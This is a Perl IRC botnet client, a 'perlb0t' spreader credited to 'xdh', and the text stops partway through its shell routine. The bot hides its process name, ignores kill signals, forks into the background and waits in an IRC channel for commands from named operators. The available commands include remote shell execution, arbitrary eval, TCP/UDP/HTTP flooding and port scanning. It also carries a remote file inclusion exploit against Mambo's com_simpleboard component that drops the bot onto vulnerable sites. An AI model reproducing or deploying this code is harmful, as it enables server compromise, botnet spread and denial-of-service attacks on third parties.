#!/usr/bin/perl
# this spreader is coded by xdh
# #datentechnik at quakenet.org
# only for testing...

my @nickname = ("index.php?page=",
	"Abdulrazak",
	"Ackerman",
	"Adams",
	"Addison",
	"Adelstein",
	"Adibe",
	"Adorno",
	"Ahlers",
	"Alavi",
	"Alcorn",
	"Alda",
	"Aleks",
	"Allison",
	"Alongi",
	"Altavilla",
	"Altenberger",
	"Altenhofen",
	"Amaral",
	"Amatangelo",
	"Ameer",
	"Amsden",
	"Anand",
	"Andel",
	"Ando",
	"Andrelus",
	"Andron",
	"Anfinrud",
	"Ansley",
	"Anthony",
	"Antos",
	"Arbia",
	"Arduini",
	"Arellano",
	"Aristotle",
	"Arjas",
	"Arky",
	"Atkins",
	"Augustus",
	"Aurelius",
	"Axelrod",
	"Axworthy",
	"Ayiemba",
	"Aykroyd",
	"Ayling",
	"Azima",
	"Bachmuth",
	"Backus",
	"Bady",
	"Baglivo",
	"Bagnold",
	"Bailar",
	"Bakanowsky",
	"Baleja",
	"Ballatori",
	"Ballew",
	"Baltz",
	"Banta",
	"Barabesi",
	"Barajas",
	"Baranczak",
	"Baranowska",
	"Barberi",
	"Barbetti",
	"Barneson",
	"Barnett",
	"Barriola",
	"Barry",
	"Bartholomew",
	"Bartolome",
	"Bartoo",
	"Basavappa",
	"Bashevis",
	"Batchelder",
	"Baumiller",
	"Bayles",
	"Bayo",
	"Beacon",
	"Beal",
	"Bean",
	"Beckman",
	"Beder",
	"Bedford",
	"Behenna",
	"Belanger",
	"Belaoussof",
	"Belfer",
	"Belin-Collart",
	"Bellavance",
	"Bellhouse",
	"Bellini",
	"Belloc",
	"Benedict-Dye",
	"Bergson",
	"Berke-Jenkins",
	"Bernardo",
	"Bernassola",
	"Bernston",
	"Berrizbeitia",
	"Betti",
	"Beynart",
	"Biagioli",
	"Bickel",
	"Binion",
	"Bir",
	"Bisema",
	"Bisho",
	"Blackbourn",
	"Blackwell",
	"Blagg",
	"Blakemore",
	"Blanke",
	"Bliss",
	"Blizard",
	"Bloch",
	"Bloembergen",
	"Bloemhof",
	"Bloxham",
	"Blyth",
	"Bolger",
	"Bolick",
	"Bollinger",
	"Bologna",
	"Boner",
	"Bonham",
	"Boniface",
	"Bontempo",
	"Book",
	"Bookbinder",
	"Boone",
	"Boorstin",
	"Borack",
	"Borden",
	"Bossi",
	"Bothman",
	"Botosh",
	"Boudin",
	"Boudrot",
	"Bourneuf",
	"Bowers",
	"Boxer",
	"Boyajian",
	"Boyes",
	"Boyland",
	"Boym",
	"Boyne",
	"Bracalente",
	"Bradac",
	"Bradach",
	"Brecht",
	"Breed",
	"Brenan",
	"Brennan",
	"Brewer",
	"Brewer",
	"Bridgeman",
	"Bridges",
	"Brinton",
	"Britz",
	"Broca",
	"Brook",
	"Brzycki",
	"Buchan",
	"Budding",
	"Bullard",
	"Bunton",
	"Burden",
	"Burdzy",
	"Burke",
	"Burridge",
	"Busetta",
	"Byatt",
	"Byerly",
	"Byrd",
	"Cage",
	"Calnan",
	"Cammelli",
	"Cammilleri",
	"Canley",
	"Capanni",
	"Caperton",
	"Capocaccia",
	"Capodilupo",
	"Cappuccio",
	"Capursi",
	"Caratozzolo",
	"Carayannopoulos",
	"Carlin",
	"Carlos",
	"Carlyle",
	"Carmichael",
	"Caroti",
	"Carper",
	"Cartmill",
	"Cascio",
	"Case",
	"Caspar",
	"Castelda",
	"Cavanagh",
	"Cavell",
	"Ceniceros",
	"Cerioli",
	"Chapman",
	"Charles",
	"Cheang",
	"Cherry",
	"Chervinsky",
	"Chiassino",
	"Chien",
	"Childress",
	"Childs",
	"Chinipardaz",
	"Chinman",
	"Christenson",
	"Christian",
	"Christiano",
	"Christie",
	"Christopher",
	"Chu",
	"Chupasko",
	"Church",
	"Ciampaglia",
	"Cicero",
	"Cifarelli",
	"Claffey",
	"Clancy",
	"Clark",
	"Clement",
	"Clifton",
	"Clow",
	"Coblenz",
	"Coito",
	"Coldren",
	"Colella",
	"Collard",
	"Collis",
	"Compton",
	"Compton",
	"Comstock",
	"Concino",
	"Condodina",
	"Connors",
	"Corey",
	"Cornish",
	"Cosmides",
	"Counter",
	"Coutaux",
	"Crawford",
	"Crocker",
	"Croshaw",
	"Croxen",
	"Croxton",
	"Cui",
	"Currier",
	"Cutler",
	"Cvek",
	"Cyders",
	"daSilva",
	"Daldalian",
	"Daly",
	"D'Ambra",
	"Danieli",
	"Dante",
	"Dapice",
	"D'arcangelo",
	"Das",
	"Dasgupta",
	"Daskalu",
	"David",
	"Dawkins",
	"DeGennaro",
	"DeLaPena",
	"del'Enclos",
	"deRousse",
	"Debroff",
	"Dees",
	"Defeciani",
	"Delattre",
	"Deleon-Rendon",
	"Delger",
	"Dell'acqua",
	"Deming",
	"Dempster",
	"Demusz",
	"Denault",
	"Denham",
	"Denison",
	"Desombre",
	"Deutsch",
	"D'fini",
	"Dicks",
	"Diefenbach",
	"Difabio",
	"Difronzo",
	"Dilworth",
	"Dionysius",
	"Dirksen",
	"Dockery",
	"Doherty",
	"Donahue",
	"Donner",
	"Doonan",
	"Dore",
	"Dorf",
	"Dosi",
	"Doty",
	"Doug",
	"Dowsland",
	"Drinker",
	"D'souza",
	"Duffin",
	"Durrett",
	"Dussault",
	"Dwyer",
	"Eardley",
	"Ebeling",
	"Eckel",
	"Edley",
	"Edner",
	"Edward",
	"Eickenhorst",
	"Eliasson",
	"Elmendorf",
	"Elmerick",
	"Elvis",
	"Encinas",
	"Enyeart",
	"Eppling",
	"Erbach",
	"Erdman",
	"Erdos",
	"Erez",
	"Espinoza",
	"Estes",
	"Etter",
	"Euripides",
	"Everett",
	"Fabbris",
	"Fagan",
	"Faioes",
	"Falco-Acosta",
	"Falorsi",
	"Faris",
	"Farone",
	"Farren",
	"Fasso'",
	"Fates",
	"Feigenbaum",
	"Fejzo",
	"Feldman",
	"Fernald",
	"Fernandes",
	"Ferrante",
	"Ferriell",
	"Feuer",
	"Fido",
	"Field",
	"Fink",
	"Finkelstein",
	"Finnegan",
	"Fiorina",
	"Fisk",
	"Fitzmaurice",
	"Flier",
	"Flores",
	"Folks",
	"Forester",
	"Fortes",
	"Fortier",
	"Fossey",
	"Fossi",
	"Francisco",
	"Franklin-Kenea",
	"Franz",
	"Frazier-Davis",
	"Freid",
	"Freundlich",
	"Fried",
	"Friedland",
	"Frisken",
	"Frowiss",
	"Fryberger",
	"Frye",
	"Fujii-Abe",
	"Fuller",
	"Furth",
	"Fusaro",
	"Gabrielli",
	"Gaggiotti",
	"Galeotti",
	"Galwey",
	"Gambini",
	"Garfield",
	"Garman",
	"Garonna",
	"Geller",
	"Gemberling",
	"Georgi",
	"Gerrett",
	"Ghorai",
	"Gibbens",
	"Gibson",
	"Gilbert",
	"Gili",
	"Gill",
	"Gillispie",
	"Gist",
	"Gleason",
	"Glegg",
	"Glendon",
	"Goldfarb",
	"Goncalves",
	"Good",
	"Goodearl",
	"Goody",
	"Gozzi",
	"Gravell",
	"Greenberg",
	"Greenfeld",
	"Griffiths",
	"Grigoletto",
	"Grummell",
	"Gruner",
	"Gruppe",
	"Guenthart",
	"Gunn",
	"Guo",
	"Ha",
	"Haar",
	"Hackman",
	"Hackshaw",
	"Haley",
	"Halkias",
	"Hallowell",
	"Halpert",
	"Hambarzumjan",
	"Hamer",
	"Hammerness",
	"Hand",
	"Hanssen",
	"Harding",
	"Hargraves",
	"Harlow",
	"Harrigan",
	"Hartman",
	"Hartmann",
	"Hartnett",
	"Harwell",
	"Haviaras",
	"Hawkes",
	"Hayes",
	"Haynes",
	"Hazlewood",
	"Heermans",
	"Heft",
	"Heiland",
	"Hellman",
	"Hellmiss",
	"Helprin",
	"Hemphill",
	"Henery",
	"Henrichs",
	"Hernandez",
	"Herrera",
	"Hester",
	"Heubert",
	"Heyeck",
	"Himmelfarb",
	"Hind",
	"Hirst",
	"Hitchcock",
	"Hoang",
	"Hock",
	"Hoffer",
	"Hoffman",
	"Hokanson",
	"Hokoda",
	"Holmes",
	"Holoien",
	"Holter",
	"Holway",
	"Holzman",
	"Hooker",
	"Hopkins",
	"Horsley",
	"Hoshida",
	"Hostage",
	"Hottle",
	"Howard",
	"Hoy",
	"Huey",
	"Huidekoper",
	"Hungerford",
	"Huntington",
	"Hupp",
	"Hurtubise",
	"Hutchings",
	"Hyde",
	"Iaquinta",
	"Ichikawa",
	"Igarashi",
	"Inamura",
	"Inniss",
	"Isaac",
	"Isaievych",
	"Isbill",
	"Isserman",
	"Iyer",
	"Jacenko",
	"Jackson",
	"Jagers",
	"Jagger",
	"Jagoe",
	"Jain",
	"Jamil",
	"Janjigian",
	"Jarnagin",
	"Jarrell",
	"Jay",
	"Jeffers",
	"Jellis",
	"Jenkins",
	"Jespersen",
	"Jewett",
	"Johannesson",
	"Johannsen",
	"Johns",
	"Jolly",
	"Jorgensen",
	"Jucks",
	"Juliano",
	"Julious",
	"Kabbash",
	"Kaboolian",
	"Kafadar",
	"Kalbfleisch",
	"Kaligian",
	"Kalil",
	"Kalinowski",
	"Kalman",
	"Kamel",
	"Kangis",
	"Karpouzes",
	"Kassower",
	"Kasten",
	"Kawachi",
	"Kee",
	"Keenan",
	"Keepper",
	"Keith",
	"Kelker",
	"Kelsey",
	"Kempton",
	"Kemsley",
	"Kendall",
	"Kerry",
	"Keul",
	"Khong",
	"Kimmel",
	"Kimmett",
	"Kimura",
	"Kindall",
	"Kinsley",
	"Kippenberger",
	"Kirscht",
	"Kittridge",
	"Kleckner",
	"Kleiman",
	"Kleinfelder",
	"Klemperer",
	"Kling",
	"Klinkenborg",
	"Klint",
	"Knuff",
	"Kobrick",
	"Koch",
	"Kohn",
	"Koivumaki",
	"Kommer",
	"Koniaris",
	"Konrad",
	"Kool",
	"Korzybski",
	"Kotter",
	"Kovaks",
	"Kraemer",
	"Krailo",
	"Krasney",
	"Kraus",
	"Kroemer",
	"Krysiak",
	"Kuenzli",
	"Kumar",
	"Kusman",
	"Kuwabara",
	"La",
	"Labunka",
	"Lafler",
	"Laing",
	"Lallemant",
	"Landes",
	"Lankes",
	"Lantieri",
	"Lanzit",
	"Laserna",
	"Lashley",
	"Lawless",
	"Lecar",
	"Lecce",
	"Leclercq",
	"Leite",
	"Lenard",
	"l'Enclos",
	"Lesser",
	"Lessi",
	"Liakos",
	"Lidano",
	"Liem",
	"Light",
	"Lightfoot",
	"Lim",
	"Linares",
	"Linda",
	"Linder",
	"Line",
	"Linehan",
	"Linzee",
	"Lippmann",
	"Lipponen",
	"Little",
	"Litvak",
	"Livernash",
	"Livi",
	"Livolsi",
	"Lizardo",
	"Locatelli",
	"Longworth",
	"Loss",
	"Loveman",
	"Lowenstein",
	"Loza",
	"Lubin",
	"Lucas",
	"Luciano",
	"Luczkow",
	"Luecke",
	"Lunetta",
	"Luoma",
	"Lussier",
	"Lutcavage",
	"Luzader",
	"Ma",
	"Maccormac",
	"Macdonald",
	"Maceachern",
	"Macintyre",
	"Mackenney",
	"MacMillan",
	"Macy",
	"Madigan",
	"Maggio",
	"Mahony",
	"Maier",
	"Maine-Hershey",
	"Maisano",
	"Malatesta",
	"Maller",
	"Malova",
	"Manalis",
	"Mandel",
	"Manganiello",
	"Mantovan",
	"March",
	"Marchbanks",
	"Marcus",
	"Margalit",
	"Margetts",
	"Marques",
	"Martinez",
	"Martochio",
	"Marton",
	"Marubini",
	"Mass",
	"Matalka",
	"Matarazzo",
	"Matsukata",
	"Mattson",
	"Mauzy",
	"May",
	"Mazzali",
	"Mazziotta",
	"Mcbride",
	"Mccaffery",
	"Mccall",
	"Mcclearn",
	"Mcdowell",
	"Mcelroy",
	"McFadden",
	"Mcghee",
	"Mcgoldrick",
	"McIlroy",
	"Mcintosh",
	"Mckenna",
	"Mclane",
	"Mclaren",
	"Mcnealy",
	"Mcnulty",
	"Meccariello",
	"Memisoglu",
	"Menzies",
	"Merikoski",
	"Merlani",
	"Merminod",
	"Merseth",
	"Merz",
	"Metelka",
	"Metropolis",
	"Meurer",
	"Michelman",
	"Middle",
	"Mieher",
	"Mills",
	"Minh",
	"Mini",
	"Minichiello",
	"Gonzalez",
	"Mitropoulos",
	"Mittal",
	"Mocroft",
	"Modestino",
	"Moeller",
	"Mohr",
	"Moiamedi",
	"Monque",
	"Montilio",
	"MooreDeCh.",
	"Morani",
	"Moreton",
	"Morrison",
	"Morrow",
	"Mortimer",
	"Mosher",
	"Mosler",
	"Mostafavi",
	"Motooka",
	"Mudarri",
	"Muello",
	"Mugnai",
	"Mulkern",
	"Mulroy",
	"Mumford",
	"Mussachio",
	"Naddeo",
	"Napolitano",
	"Nardi",
	"Nardone",
	"Naviaux",
	"Nayduch",
	"Nelson",
	"Nenna",
	"Nesci",
	"Neuman",
	"Newfeld",
	"Newlin",
	"Ng",
	"Ni",
	"Nickerson",
	"Nickoloff",
	"Nisenson",
	"Nitabach",
	"Notman",
	"Nuzum",
	"Ocougne",
	"Ogata",
	"Oh",
	"O'hagan",
	"Oldford",
	"Olsen",
	"Olson",
	"Olszewski",
	"O'malley",
	"Oman",
	"O'meara",
	"Opel",
	"Oray",
	"Orfield",
	"Orsi",
	"Ospina",
	"Ostrowski",
	"Ottaviani",
	"Otten",
	"Ouchida",
	"Ovid",
	"PaesDealmeida",
	"Paine",
	"Palayoor",
	"Palepu",
	"Pallara",
	"Palmitesta",
	"Panadero",
	"Panizzon",
	"Pantilla",
	"Paoletti",
	"Parmeggiani",
	"Parris",
	"Partridge",
	"Pascucci",
	"Patefield",
	"Patrick",
	"Pattullo",
	"Pavetti",
	"Pavlon",
	"Pawloski",
	"Paynter",
	"Peabody",
	"Pearlberg",
	"Pederson",
	"Peishel",
	"Penny",
	"Pereira",
	"Perko",
	"Perlak",
	"Perlman",
	"Perna",
	"Perone",
	"Perrimon",
	"Peters",
	"Petruzello",
	"Pettibone",
	"Pettit",
	"Pfister",
	"Pilbeam",
	"Pinot",
	"Plancon",
	"Plant",
	"Plasket",
	"Plous",
	"Po",
	"Pocobene",
	"Poincaire",
	"Pointer",
	"Poirier",
	"Polak",
	"Polanyi",
	"Politis",
	"Poma",
	"Poolman",
	"Powers",
	"Presper",
	"Preucel",
	"Prevost",
	"Pritchard",
	"Pritz",
	"Proietti",
	"Prothrow-Stith",
	"Puccia",
	"Pugh",
	"Pynchon",
	"Quaday",
	"Quetin",
	"Rabe",
	"Rabkin",
	"Radeke",
	"Rajagopalan",
	"Raney",
	"Rangan",
	"Rankin",
	"Rapple",
	"Rayport",
	"Redden-Tyler",
	"Reedquist",
	"Cunningham",
	"Reinold",
	"Remak",
	"Renick",
	"Repetto",
	"Resnik",
	"Rhea",
	"Richmond",
	"Rielly",
	"Rindos",
	"Rineer",
	"Rish",
	"Rivera",
	"Robinson",
	"Rocha",
	"Roesler",
	"Rogers",
	"Ronen",
	"Row",
	"Royal",
	"Ru",
	"Ruan",
	"Ruderman",
	"Ruescher",
	"Rush",
	"Ryu",
	"Sabatello",
	"Sadler",
	"Safire",
	"Sahu",
	"Sali",
	"Samson",
	"Sanchez-Ramirez",
	"Sanna",
	"Sapers",
	"Sarin",
	"Sartore",
	"Sase",
	"Satin",
	"Satta",
	"Satterthwaite",
	"Sawtell",
	"Sayied",
	"Scarponi",
	"Scepan",
	"Scharf",
	"Scharlemann",
	"Scheiner",
	"Schiano",
	"Schifini",
	"Schilling",
	"Schmitt",
	"Schossberger",
	"Schuman",
	"Schutte",
	"Schuyler",
	"Schwan",
	"Schwickrath",
	"Scovel",
	"Scudder",
	"Seaton",
	"Seeber",
	"Segal",
	"Sekler",
	"Selvage",
	"Sen",
	"Sennett",
	"Seterdahl",
	"Sexton",
	"Seyfert",
	"Shaikh",
	"Shakis",
	"Shankland",
	"Shanley",
	"Shar",
	"Shatrov",
	"Shavelson",
	"Shea",
	"Sheats",
	"Shepherd",
	"Sheppard",
	"Shepstone",
	"Shesko",
	"Shia",
	"Shibata",
	"Shimon",
	"Siesto",
	"Sigalot",
	"Sigini",
	"Signa",
	"Silverman",
	"Silvetti",
	"Sinsabaugh",
	"Sirilli",
	"Sites",
	"Skane",
	"Skerry",
	"Skoda",
	"Sloan",
	"Slowe",
	"Smilow",
	"Sniffen",
	"Snodgrass",
	"Socolow",
	"Solon",
	"Somers",
	"Sommariva",
	"Sorabella",
	"Sorg",
	"Sottak",
	"Soukup",
	"Soule",
	"Soultanian",
	"Spanier",
	"Sparrow",
	"Spaulding",
	"Speizer",
	"Spence",
	"Sperber",
	"Spicer",
	"Spiegelhalter",
	"Spiliotis",
	"Spinrad",
	"StMartin",
	"Stalvey",
	"Stam",
	"Stang",
	"Stassinopolus",
	"States",
	"Statlender",
	"Stefani",
	"Steiner",
	"Stephanian",
	"Stepniewska",
	"Stewart-Oaten",
	"Stiepock",
	"Stillwell",
	"Stock",
	"Stockton",
	"Stockwell",
	"Stolzenberg",
	"Stonich",
	"Storer",
	"Stott",
	"Strange",
	"Strauch",
	"Streiff",
	"Stringer",
	"Sullivan",
	"Sumner",
	"Suo",
	"Surdam",
	"Sweeting",
	"Sweetser",
	"Swindle",
	"Tagiuri",
	"Tai",
	"Talaugon",
	"Tambiah",
	"Tandler",
	"Tanowitz",
	"Tatar",
	"Taveras",
	"Tawn",
	"Tcherepnin",
	"Teague",
	"Temes",
	"Temmer",
	"Tenney",
	"Terracini",
	"Than",
	"Thavaneswaran",
	"Theodos",
	"Thibault",
	"Thisted",
	"Thomsen",
	"Throop",
	"Tierney",
	"Till",
	"Timmons",
	"Tofallis",
	"Tollestrup",
	"Tolls",
	"Tolman",
	"Tomford",
	"Toomer",
	"Topulos",
	"Torresi",
	"Torske",
	"Towler",
	"Toye",
	"Traebert",
	"Trenga",
	"Trewin",
	"Tringali",
	"Troiani",
	"Troy",
	"Truss",
	"Tsiatis",
	"Tsomides",
	"Tsukurov",
	"Tuck",
	"Tudge",
	"Tukan",
	"Turano",
	"Turek",
	"Tuttle",
	"Twells",
	"Tzamarias",
	"Ullman",
	"Untermeyer",
	"Upsdell",
	"Urban",
	"Urdang-Brown",
	"Usdan",
	"Uzuner",
	"Vacca",
	"Waite",
	"Valberg",
	"Valencia",
	"Wales",
	"Wallenberg",
	"Walter",
	"vanAllen",
	"VanZwet",
	"Vandenberg",
	"Vanheeckeren",
	"Warshafsky",
	"Wasowska",
	"Vasquez",
	"Waugh",
	"Weighart",
	"Weingarten",
	"Weinhaus",
	"Weissbourd",
	"Weissman",
	"Velasquez",
	"Welles",
	"Welsh",
	"Wengret",
	"Venne",
	"Verghese",
	"Wescott",
	"Wetzel",
	"Whately",
	"Whilton",
	"White",
	"Whitla",
	"Whittaker",
	"Viana",
	"Viano",
	"Wiedersheim",
	"Wiener",
	"Viens",
	"Vignola",
	"Wilder",
	"Wilhelm",
	"Wilk",
	"Wilkin",
	"Wilkinson",
	"Villarreal",
	"Willstatter",
	"Wilson",
	"Vitali",
	"Viviani",
	"Voigt",
	"Wolk",
	"VonHoffman",
	"Woo",
	"Wooden",
	"Woods",
	"Woods-Powell",
	"Vorhaus",
	"Votey",
	"Yacono",
	"Yamane",
	"Yankee",
	"Yarchuk",
	"Yates",
	"Ybarra",
	"Yedidia",
	"Yesson",
	"Yetiv",
	"Yoffe",
	"Yoo",
	"Youk-See",
	"Yu",
	"Zachary",
	"Zahedi",
	"Zangwill",
	"Zegans",
	"Zerbini",
	"Zoldak",
	"Zucconi",
	"Zurn",
	"Zwiers");

my $nick = $nickname[rand scalar @nickname];

my $ircname = $nickname[rand scalar @nickname];


my $processo = 'ps -x';

system("");


# funny world...

my $linas_max='4';
my $sleep='5';
my @adms=("alef","mauroni","sorin");
my @hostauth=("realmadrid.pl","Sorin.users.super-chat.org");
my @canais=("#arubia");
chop (my $realname = `uname -a`);
$servidor='oslo1.no.eu.super-chat.org' unless $servidor;
my $porta='6667';
my $VERSAO = 'i`m the l33t haxor';
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir("/");
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();

$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
  } else {
      print $IRC_cur_socket "$_[0]\n";
  }
}

sub conectar {
   my $meunick = $_[0];
   my $servidor_con = $_[1];
   my $porta_con = $_[2];

   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con", PeerPort=>$porta_con) or return(1);
   if (defined($IRC_socket)) {
     $IRC_cur_socket = $IRC_socket;

     $IRC_socket->autoflush(1);
     $sel_cliente->add($IRC_socket);

     $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
     $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
     nick("$meunick");
     sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
     sleep 1;
   }
}
my $line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
   delete($irc_servers{''}) if (defined($irc_servers{''}));
   my @ready = $sel_cliente->can_read(0);
   next unless(@ready);
   foreach $fh (@ready) {
     $IRC_cur_socket = $fh;
     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
     $nread = sysread($fh, $msg, 4096);
     if ($nread == 0) {
        $sel_cliente->remove($fh);
        $fh->close;
        delete($irc_servers{$fh});
     }
     @lines = split (/\n/, $msg);

     for(my $c=0; $c<= $#lines; $c++) {
       $line = $lines[$c];
       $line=$line_temp.$line if ($line_temp);
       $line_temp='';
       $line =~ s/\r$//;
       unless ($c == $#lines) {
         parse("$line");
       } else {
           if ($#lines == 0) {
             parse("$line");
           } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");
           } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse("$line");
           } else {
               $line_temp = $line;
           }
       }
      }
   }
}

sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING \:(.*)/) {
     sendraw("PONG :$1");
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
       my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
       if ($args =~ /^\001VERSION\001$/) {
         notice("$pn", "\001VERSION mIRC v6.16 Khaled Mardam-Bey\001");
       }
       if (grep {$_ =~ /^\Q$hostmask\E$/i } @hostauth) {
       if (grep {$_ =~ /^\Q$pn\E$/i } @adms) {
         if ($onde eq "$meunick"){
           shell("$pn", "$args");
         }
         if ($args =~ /^(\Q$meunick\E|\!say)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {
              ircase("$pn","$onde","$1") unless ($natrix eq "!bot" and $arg =~ /^\!nick/);
            } elsif ($arg =~ /^\@(.*)/) {
                $ondep = $onde;
                $ondep = $pn if $onde eq $meunick;
                bfunc("$ondep","$1");
            } else {
                shell("$onde", "$arg");
            }
         }
       }
	}
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
       if (lc($1) eq lc($meunick)) {
         $meunick=$4;
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       }
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
       nick("$meunick|".int rand(999999));
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
       $meunick = $2;
       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
       foreach my $canal (@canais) {
         sendraw("JOIN $canal ddosit");
       }
   }
}


sub bfunc {
  my $printl = $_[0];
  my $funcarg = $_[1];
  if (my $pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           if ($funcarg =~ /^portscan (.*)/) {
             my $hostip="$1";
             my @portas=("21","22","23","25","80","113","135","445","1025","5000","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","8080","8018");
             my (@aberta, %porta_banner);
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[SCAN]\002 Scanning ".$1." for open ports.");
             foreach my $porta (@portas)  {
                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);
                if ($scansock) {
                   push (@aberta, $porta);
                   $scansock->close;
                }
             }

             if (@aberta) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[SCAN]\002 Open port(s): @aberta");
             } else {
               sendraw($IRC_cur_socket,"PRIVMSG $printl :\002[SCAN]\002 No open ports found");
             }
           }
           if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[TCP]\002 Attacking ".$1.":".$2." for ".$3." seconds.");
	     my $itime = time;
	     my ($cur_time);
             $cur_time = time - $itime;
	     while ($3>$cur_time){
             $cur_time = time - $itime;
	     &tcpflooder("$1","$2","$3");
             }
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[TCP]\002 Attack done ".$1.":".$2.".");
           }
	   if ($funcarg =~ /^version/) {
		sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[VERSION]\002 perlb0t ver ".$VERSAO);
		}
           if ($funcarg =~ /^attack!\s+(\d+)\s+(.*)/) {
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[GOOGLE]\002 Scanning for unpatched by mambo for ".$1." seconds.");
	     srand;
	     my $itime = time;
	     my ($cur_time);
	     my ($exploited);
	     $boturl=$2;
             $cur_time = time - $itime;$exploited = 0;
		while($1>$cur_time){
		    $cur_time = time - $itime;
		    @urls=fetch();
			foreach $url (@urls) {
			$cur_time = time - $itime;
			my $path = "";my $file = "";($path, $file) = $url =~ /^(.+)\/(.+)$/;
			$url =$path."/components/com_simpleboard/file_upload.php?sbp=$boturl?";
			$page = http_query($url);
			$exploited = $exploited + 1;
		    }
		}
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[GOOGLE]\002 Exploited ".$exploited." boxes in ".$1." seconds.");
           }
           if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[HTTP]\002 Attacking ".$1.":80 for ".$2." seconds.");
	     my $itime = time;
	     my ($cur_time);
             $cur_time = time - $itime;
	     while ($2>$cur_time){
             $cur_time = time - $itime;
	     my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
             print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
	     close($socket);
             }
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[HTTP]\002 Attacking done ".$1.".");
           }
           if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[UDP]\002 Attacking ".$1." with ".$2." Kb packets for ".$3." seconds.");
             my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
             $dtime = 1 if $dtime == 0;
             my %bytes;
             $bytes{igmp} = $2 * $pacotes{igmp};
             $bytes{icmp} = $2 * $pacotes{icmp};
             $bytes{o} = $2 * $pacotes{o};
             $bytes{udp} = $2 * $pacotes{udp};
             $bytes{tcp} = $2 * $pacotes{tcp};
             sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[UDP]\002 Sent ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." Kb in ".$dtime." seconds to ".$1.".");
           }
           exit;
       }
  }
}

sub ircase {
  my ($kem, $printl, $case) = @_;

  if ($case =~ /^join (.*)/) {
     j("$1");
   }
   if ($case =~ /^part (.*)/) {
      p("$1");
   }
   if ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
        for (my $ca = 1; $ca <= $1; $ca++ ) {
          p("$2");
          j("$2");
        }
      } else {
          p("$chan");
          j("$chan");
      }
   }
   if ($case =~ /^op/) {
      op("$printl", "$kem") if $case eq "op";
      my $oarg = substr($case, 3);
      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   if ($case =~ /^deop/) {
      deop("$printl", "$kem") if $case eq "deop";
      my $oarg = substr($case, 5);
      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   if ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1", "$2");
   }
   if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        msg("$2", "$3");
      }
   }
   if ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1", "$2");
   }
   if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        ctcp("$2", "$3");
      }
   }
   if ($case =~ /^nick (.*)/) {
      nick("$1");
   }
   if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
       conectar("$2", "$1", 6667);
   }
   if ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }
   if ($case =~ /^eval (.*)/) {
     eval "$1";
   }
}

sub shell {
  my $printl=$_[0];
  my $comando=$_[1];
  if ($comando =~ /cd (.*)/) {
    chdir("$1") || msg("$printl", "No such file or directory");
    return;
